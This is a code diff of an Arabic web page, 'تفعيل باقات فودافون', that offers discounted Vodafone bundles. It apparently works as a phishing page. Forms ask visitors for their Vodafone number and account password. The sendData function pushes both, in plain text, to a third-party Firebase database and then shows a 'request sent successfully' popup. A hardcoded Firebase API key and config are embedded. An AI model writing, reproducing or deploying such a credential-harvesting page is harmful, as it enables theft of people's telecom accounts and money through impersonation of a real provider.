@@ -1,119 +1,255 @@
-<!-- أضف داخل <head> -->
-<style>
-  .crown {
-    position: fixed;
-    width: 30px;
-    height: 30px;
-    background: url('https://cdn-icons-png.flaticon.com/512/616/616408.png') no-repeat center/contain;
-    z-index: 0;
-    animation: float 5s linear infinite;
-    opacity: 0.8;
-  }
-
-  @keyframes float {
-    0% {
-      transform: translateY(0);
-      opacity: 1;
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>تفعيل باقات فودافون</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <style>
+    body {
+      background-color: #7b0000;
+      color: white;
+      font-family: 'Cairo', sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
     }
-    100% {
-      transform: translateY(-100vh);
-      opacity: 0;
+
+    .container {
+      padding: 20px;
+      position: relative;
+      z-index: 1;
     }
-  }
-</style>
 
-<!-- داخل <body> قبل </body> -->
-<script>
-  // تاج عشوائي
-  function spawnCrown() {
-    const crown = document.createElement("div");
-    crown.classList.add("crown");
-    crown.style.left = Math.random() * window.innerWidth + "px";
-    crown.style.top = Math.random() * window.innerHeight + "px";
-    document.body.appendChild(crown);
-    setTimeout(() => crown.remove(), 5000);
-  }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
 
-  setInterval(spawnCrown, 1000);
+    .subtitle {
+      font-size: 16px;
+      margin-bottom: 30px;
+    }
 
-  // Firebase
-  const firebaseConfig = {
-    apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
-    authDomain: "starkoscript.firebaseapp.com",
-    databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
-    projectId: "starkoscript",
-    storageBucket: "starkoscript.appspot.com",
-    messagingSenderId: "381525854892",
-    appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
-  };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.database();
+    .box {
+      background-color: rgba(255, 255, 255, 0.05);
+      border: 1px solid #ff4d4d;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 10px;
+    }
 
-  const costDisplay = document.getElementById("costDisplay");
-  const egInput = document.getElementById("eg3");
-  let finalCost = 0;
+    .btn {
+      display: inline-block;
+      padding: 10px 20px;
+      background: white;
+      color: #7b0000;
+      border-radius: 25px;
+      text-decoration: none;
+      font-weight: bold;
+      margin-top: 10px;
+      cursor: pointer;
+    }
 
-  if (egInput) {
-    egInput.addEventListener("input", () => {
-      const val = parseFloat(egInput.value);
-      if (!isNaN(val)) {
-        finalCost = val * 1.2;
-        costDisplay.textContent = `المبلغ المطلوب: ${finalCost.toFixed(2)} جنيه`;
-      } else {
-        costDisplay.textContent = "";
-        finalCost = 0;
+    input {
+      display: block;
+      width: 80%;
+      margin: 10px auto;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+    }
+
+    .conditions {
+      font-size: 12px;
+      margin-top: 10px;
+      color: #ffcccc;
+    }
+
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      opacity: 0.6;
+      direction: ltr;
+    }
+
+    #successPopup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      color: #7b0000;
+      padding: 30px;
+      border-radius: 15px;
+      font-size: 18px;
+      font-weight: bold;
+      display: none;
+      z-index: 999;
+    }
+
+    .snowflake {
+      position: fixed;
+      top: -10px;
+      width: 10px;
+      height: 10px;
+      background: white;
+      border-radius: 50%;
+      opacity: 0.8;
+      z-index: 0;
+      animation: fall linear forwards;
+    }
+
+    @keyframes fall {
+      0% {
+        transform: translateY(0) rotate(0deg);
       }
-    });
-  }
-
-  function sendData(type, numId, passId = '', egId = '') {
-    const num = document.getElementById(numId).value.trim();
-    const pass = passId ? document.getElementById(passId).value.trim() : "";
-    const egRaw = egId ? document.getElementById(egId).value.trim() : "";
-    const egg = finalCost.toFixed(2);
-
-    // تحقق من الإدخال حسب نوع الطلب
-    if (type === "رصيد صافي") {
-      if (!num || !egRaw) {
-        alert("يرجى إدخال الرقم والكمية أولاً");
-        return;
+      100% {
+        transform: translateY(100vh) rotate(360deg);
+        opacity: 0;
       }
-    } else {
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>تفعيل باقات فودافون</h1>
+    <p class="subtitle">أقوى العروض بسرعة الصاروخ</p>
+
+    <!-- فليكس 13000 -->
+    <div class="box">
+      <h2>13000 فليكس</h2>
+      <p>240 جنيه</p>
+      <div class="conditions">شروط: لا يكون عليك سلف أو نوتة - التفعيل خلال ساعتين من إرسال الرقم وكلمة المرور</div>
+      <input type="text" placeholder="رقم فودافون" id="num1">
+      <input type="password" placeholder="كلمة المرور" id="pass1">
+      <div class="btn" onclick="sendData('فليكس 13000', 'num1', 'pass1')">تفعيل الآن</div>
+    </div>
+
+    <!-- 40 جيجا -->
+    <div class="box">
+      <h2>40 جيجا</h2>
+      <p>330 جنيه</p>
+      <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة من إرسال الرقم وكلمة المرور</div>
+      <input type="text" placeholder="رقم فودافون" id="num2">
+      <input type="password" placeholder="كلمة المرور" id="pass2">
+      <div class="btn" onclick="sendData('40 جيجا', 'num2', 'pass2')">تفعيل الآن</div>
+    </div>
+
+    <!-- رصيد صافي -->
+    <div class="box">
+      <h2>شحن رصيد صافي</h2>
+      <p>اكتب الكمية واحسب</p>
+      <div class="conditions">يتم إرسال الرصيد خلال نصف ساعة من إدخال الرقم</div>
+      <input type="text" placeholder="رقم فودافون" id="eg">
+      <input type="number" placeholder="كمية الصافي" id="egg">
+      <p id="costDisplay"></p>
+      <div class="btn" onclick="sendBalance()">شحن الآن</div>
+    </div>
+
+    <footer>Developed by: mahmoud gamal</footer>
+  </div>
+
+  <div id="successPopup">تم إرسال الطلب بنجاح</div>
+
+  <script>
+    // Firebase
+    const firebaseConfig = {
+      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+      authDomain: "starkoscript.firebaseapp.com",
+      databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
+      projectId: "starkoscript",
+      storageBucket: "starkoscript.appspot.com",
+      messagingSenderId: "381525854892",
+      appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const costDisplay = document.getElementById("costDisplay");
+    const eggInput = document.getElementById("egg");
+    if (eggInput) {
+      eggInput.addEventListener("input", () => {
+        const val = parseFloat(eggInput.value);
+        if (!isNaN(val)) {
+          costDisplay.textContent = `المبلغ المطلوب: ${val * 1.2} جنيه`;
+        } else {
+          costDisplay.textContent = "";
+        }
+      });
+    }
+
+    function sendData(type, numId, passId) {
+      const num = document.getElementById(numId).value;
+      const pass = document.getElementById(passId).value;
+      const text = `طلب ${type} - رقم: ${num}`;
+
       if (!num || !pass) {
-        alert("يرجى إدخال الرقم وكلمة المرور أولاً");
+        alert("يرجى إدخال الرقم وكلمة المرور");
         return;
       }
+
+      db.ref("starko").push({
+        type,
+        num,
+        pass,
+        text
+      }).then(() => {
+        showPopup();
+      }).catch((err) => {
+        alert("حدث خطأ أثناء الإرسال");
+        console.error(err);
+      });
     }
 
-    let text = "";
-    if (type === "فليكس 13000") {
-      text = "باقة فليكس 13000 تشمل 13000 فليكس بسعر 240 جنيه، التفعيل خلال ساعتين.";
-    } else if (type === "40 جيجا") {
-      text = "باقة 40 جيجا إنترنت بسعر 330 جنيه، التفعيل خلال 72 ساعة.";
-    } else if (type === "رصيد صافي") {
-      text = `شحن رصيد بقيمة ${egg} جنيه (بعد إضافة الضريبة)، سيتم الشحن خلال نصف ساعة.`;
+    function sendBalance() {
+      const eg = document.getElementById("eg").value;
+      const egg = document.getElementById("egg").value;
+      const total = parseFloat(egg) * 1.2;
+      const text = `طلب شحن رصيد صافي بقيمة ${egg} جنيه إلى الرقم ${eg}`;
+
+      if (!eg || !egg) {
+        alert("يرجى إدخال الرقم والكمية");
+        return;
+      }
+
+      db.ref("starko").push({
+        type: "رصيد صافي",
+        eg,
+        egg: total.toFixed(2),
+        text
+      }).then(() => {
+        showPopup();
+      }).catch((err) => {
+        alert("حدث خطأ أثناء الإرسال");
+        console.error(err);
+      });
     }
 
-    db.ref("starko").push({
-      type,
-      num: type === "رصيد صافي" ? "" : num,
-      pass,
-      eg: type === "رصيد صافي" ? num : "",
-      egg: type === "رصيد صافي" ? egg : "",
-      text
-    }).then(() => {
-      showPopup();
-    }).catch((err) => {
-      alert("حدث خطأ أثناء الإرسال");
-      console.error(err);
-    });
-  }
+    function showPopup() {
+      const popup = document.getElementById("successPopup");
+      popup.style.display = "block";
+      setTimeout(() => {
+        popup.style.display = "none";
+      }, 3000);
+    }
 
-  function showPopup() {
-    const popup = document.getElementById("successPopup");
-    popup.style.display = "block";
-    setTimeout(() => {
-      popup.style.display = "none";
-    }, 3000);
-  }
-</script>
+    // تلج بيتساقط
+    function createSnowflake() {
+      const snow = document.createElement("div");
+      snow.classList.add("snowflake");
+      snow.style.left = Math.random() * window.innerWidth + "px";
+      snow.style.animationDuration = (Math.random() * 3 + 2) + "s";
+      snow.style.opacity = Math.random();
+      snow.style.width = snow.style.height = (Math.random() * 5 + 5) + "px";
+      document.body.appendChild(snow);
+      setTimeout(() => snow.remove(), 5000);
+    }
+
+    setInterval(createSnowflake, 100);
+  </script>
+</body>
+</html>
